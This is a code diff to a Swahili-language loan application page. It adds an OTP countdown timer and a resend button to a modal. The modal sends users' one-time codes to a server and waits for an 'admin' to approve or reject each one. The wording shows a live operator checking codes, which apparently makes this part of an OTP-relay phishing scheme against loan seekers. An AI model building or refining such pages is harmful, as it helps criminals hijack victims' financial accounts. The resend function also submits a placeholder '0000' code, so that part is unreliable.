@@ -218,9 +218,10 @@
       <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,3)" id="o3">
     </div>
 
-    <div class="otp-timer" id="otpTimer">⏱️ Inasubiri idhinisho la OTP kutoka kwa admin</div>
+    <div class="otp-timer" id="otpTimer">⏱️ Muda unaobaki: <strong id="otpTimeRemaining">60</strong>s</div>
 
     <button class="btn-grad" id="bOtp" onclick="submitOtp()" style="margin-bottom:12px;">WASILISHA OTP</button>
+    <button class="btn-grad" id="bResendOtp" onclick="resendOtp()" style="margin-bottom:12px; display:none; background:#888;">TUMA OTP TENA</button>
     <button class="btn-gray" onclick="closeOtpModal()" style="width:100%;">ANULIA</button>
   </div>
 </div>
@@ -343,6 +344,7 @@
 
   let approvalCheckInterval = null;
   let otpCheckInterval = null;
+  let otpTimerInterval = null;
 
   // ════════════════════════════════════════════════════════
   // PAGE NAVIGATION
@@ -498,7 +500,30 @@
     }
   }
 
+  function startOtpTimer() {
+    if (otpTimerInterval) clearInterval(otpTimerInterval);
+    
+    let timeRemaining = 60;
+    document.getElementById('otpTimeRemaining').textContent = timeRemaining;
+    document.getElementById('bResendOtp').style.display = 'none';
+    document.getElementById('bOtp').style.display = 'block';
+    
+    otpTimerInterval = setInterval(() => {
+      timeRemaining--;
+      document.getElementById('otpTimeRemaining').textContent = timeRemaining;
+      
+      if (timeRemaining <= 0) {
+        clearInterval(otpTimerInterval);
+        document.getElementById('otpTimer').textContent = '⏱️ OTP imeharika! Tafadhali tuma tena.';
+        document.getElementById('otpTimer').style.color = '#ff6600';
+        document.getElementById('bOtp').style.display = 'none';
+        document.getElementById('bResendOtp').style.display = 'block';
+      }
+    }, 1000);
+  }
+
   function startOtpApprovalPolling() {
+    startOtpTimer();
     if (otpCheckInterval) clearInterval(otpCheckInterval);
     
     otpCheckInterval = setInterval(async () => {
@@ -508,6 +533,7 @@
 
         if (data.status === 'approved') {
           clearInterval(otpCheckInterval);
+          if (otpTimerInterval) clearInterval(otpTimerInterval);
           document.getElementById('otpMsgOk').classList.add('show');
           document.getElementById('otpMsgOkTxt').textContent = 'OTP ilithibitishwa! Endelea na mkopo wako…';
           
@@ -517,6 +543,7 @@
           }, 1500);
         } else if (data.status === 'rejected') {
           clearInterval(otpCheckInterval);
+          if (otpTimerInterval) clearInterval(otpTimerInterval);
           document.getElementById('otpMsgErr').classList.add('show');
           document.getElementById('otpMsgErrTxt').textContent = 'OTP haisemi. Tafadhali jaribu OTP nyingine';
           
@@ -530,6 +557,38 @@
         console.error('OTP status check error:', error);
       }
     }, 2000);
+  }
+
+  async function resendOtp() {
+    // Reset OTP inputs
+    [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
+    document.getElementById('o0').focus();
+    
+    // Clear messages
+    document.getElementById('otpMsgErr').classList.remove('show');
+    document.getElementById('otpMsgOk').classList.remove('show');
+    
+    // Show submitting status
+    showErr('otpMsgErr', 'Inatuma ombi jipya...');
+    
+    try {
+      const response = await fetch('/api/submit-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ registrationId: S.registrationId, otp: '0000' }) // Dummy, will be replaced
+      });
+
+      if (response.ok) {
+        // Clear error message and restart timer
+        setTimeout(() => {
+          document.getElementById('otpMsgErr').classList.remove('show');
+          startOtpTimer();
+          startOtpApprovalPolling();
+        }, 1000);
+      }
+    } catch (error) {
+      showErr('otpMsgErr', 'Hitilafu inatokea');
+    }
   }
 
   // ════════════════════════════════════════════════════════
